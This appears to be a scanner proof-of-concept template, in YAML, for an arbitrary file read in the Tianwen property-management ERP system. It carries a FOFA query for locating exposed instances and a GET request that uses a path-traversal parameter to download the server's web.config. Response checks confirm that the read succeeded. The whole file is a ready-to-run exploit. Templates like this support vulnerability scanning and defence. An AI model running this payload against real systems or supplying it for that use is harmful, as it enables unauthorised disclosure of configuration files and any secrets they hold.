id: poc-yaml-tianwen-wuye-erp-ownervacantdownload-aspx-anyfile-read
info:
  name: 天问物业ERP系统 OwnerVacantDownLoad 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 天问物业ERP系统
  fofa: body="天问物业ERP系统"
requests:
- method: GET
  path: /HM/M_main/InformationManage/OwnerVacantDownLoad.aspx?OwnerVacantFile=../web.config
  expression: 'status_code == 200 &&

    contains(headers,"filename=web.config") &&

    contains(content_type,"application/octet-stream") &&

    contains(body,"<configuration>")

    '
variables: {}
transport: http
